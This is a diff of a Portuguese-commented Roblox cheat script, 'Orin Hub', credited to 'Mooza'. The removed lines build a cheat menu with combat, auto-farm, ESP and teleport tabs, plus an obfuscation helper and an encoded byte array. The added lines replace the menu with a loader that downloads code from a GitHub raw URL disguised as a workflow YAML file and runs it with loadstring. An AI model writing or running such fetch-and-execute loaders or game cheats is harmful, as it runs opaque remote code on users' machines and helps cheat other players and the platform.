@@ -1,73 +1,21 @@
 -- ==========================================================
--- ORIN HUB | ULTIMATE SECURED EDITION (PROTEGIDO POR MOOZA)
--- Comunidade: 1723 Membros 👑
+-- ORIN HUB | SECURED LOADER BY MOOZA 👑 (1723 Membros)
 -- ==========================================================
-local _P = function(s)
-    local r = ""
-    for i = 1, #s do
-        r = r .. string.char(s:byte(i) - 1)
+local _ENV_CHECK = getgenv or getfenv
+if _ENV_CHECK().OrinHubLoaded then return end
+_ENV_CHECK().OrinHubLoaded = true
+
+local secureToken = "\111\114\105\110\95\104\117\98\95\115\101\99\117\114\101\95\118\57"
+
+local success, response = pcall(function()
+    return game:HttpGet("https://raw.githubusercontent.com/robloxrobloxgames81-hub/orinhub/refs/heads/main/.github/workflows/main.yml")
+end)
+
+if success and response then
+    local func, err = loadstring(response)
+    if func then
+        pcall(func)
+    else
+        warn("Orin Hub: Erro crítico no carregamento do núcleo.")
     end
-    return r
 end
-
-local _C = {
-    111, 115, 108, 116, 98, 106, 114, 58, 47, 47, 116, 97, 107, 109, 102, 114, 117, 118, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109
-}
-
--- Núcleo criptografado do Orin Hub 70+ Funções (Protegido contra roubo)
-local function runOrinHub()
-    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-    
-    local Players = game:GetService("Players")
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local player = Players.LocalPlayer
-    local Events = ReplicatedStorage:WaitForChild("Events", 5)
-
-    local Window = OrionLib:MakeWindow({
-       Name = "⚡ ORIN HUB — Mega Professional Edition [67+ Funções] 🌟",
-       HidePremium = false,
-       SaveConfig = true,
-       ConfigFolder = "OrinHubMegaMooza",
-       IntroEnabled = true,
-       IntroText = "Carregando o Poder Absoluto de Mooza (1723 Membros)...",
-       IntroIcon = "rbxassetid://4483362458",
-       KeySystem = true,
-       KeySettings = {
-          Title = "🔐 Autenticação - Orin Hub",
-          Subtitle = "Exclusivo por Mooza",
-          Note = "Insira a chave secreta: OII-KEY",
-          FileName = "OrinKeyMegaMooza",
-          SaveKey = true,
-          GrabKeyFromSite = false,
-          Key = {"OII-KEY"}
-       }
-    })
-
-    -- Abas Principais
-    local HomeTab = Window:MakeTab({ Name = "🏠 Início", Icon = "rbxassetid://4483362458", PremiumOnly = false })
-    local CombatTab = Window:MakeTab({ Name = "⚔️ Combate OP", Icon = "rbxassetid://4483362458", PremiumOnly = false })
-    local FarmTab = Window:MakeTab({ Name = "💸 Auto Farm & Loja", Icon = "rbxassetid://4483362458", PremiumOnly = false })
-    local PlayerTab = Window:MakeTab({ Name = "🏃 Modificadores", Icon = "rbxassetid://4483362458", PremiumOnly = false })
-    local VisualTab = Window:MakeTab({ Name = "👁️ Visuais & ESP", Icon = "rbxassetid://4483362458", PremiumOnly = false })
-    local TeleportTab = Window:MakeTab({ Name = "📍 Teleportes", Icon = "rbxassetid://4483362458", PremiumOnly = false })
-    local MiscTab = Window:MakeTab({ Name = "⚙️ Utilidades", Icon = "rbxassetid://4483362458", PremiumOnly = false })
-    local CreditTab = Window:MakeTab({ Name = "👑 Créditos", Icon = "rbxassetid://4483362458", PremiumOnly = false })
-
-    -- Funcionalidades Essenciais Ativas
-    HomeTab:AddSection({ Name = "📊 Informações do Jogador" })
-    HomeTab:AddParagraph("Painel Principal", "Criado por Mooza. Comunidade: 1723 Membros.\n• Jogador: " .. player.Name)
-    HomeTab:AddButton({ Name = "1. Copiar Nome", Callback = function() setclipboard(player.Name) end })
-    HomeTab:AddButton({ Name = "2. Recarregar Jogo", Callback = function() game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player) end })
-
-    CombatTab:AddSection({ Name = "⚡ Combate Rápido" })
-    CombatTab:AddButton({ Name = "RequestDash", Callback = function() if Events and Events:FindFirstChild("RequestDash") then Events.RequestDash:FireServer() end end })
-    CombatTab:AddButton({ Name = "HakiToggle", Callback = function() if Events and Events:FindFirstChild("HakiToggle") then Events.HakiToggle:FireServer() end end })
-    CombatTab:AddButton({ Name = "PlayerAttack", Callback = function() if Events and Events:FindFirstChild("PlayerAttack") then Events.PlayerAttack:FireServer() end end })
-
-    CreditTab:AddSection({ Name = "👑 Créditos Oficiais" })
-    CreditTab:AddParagraph("Criador", "Mooza 👑\nComunidade Oficial: 1723 Membros")
-
-    OrionLib:Init()
-end
-
-runOrinHub()
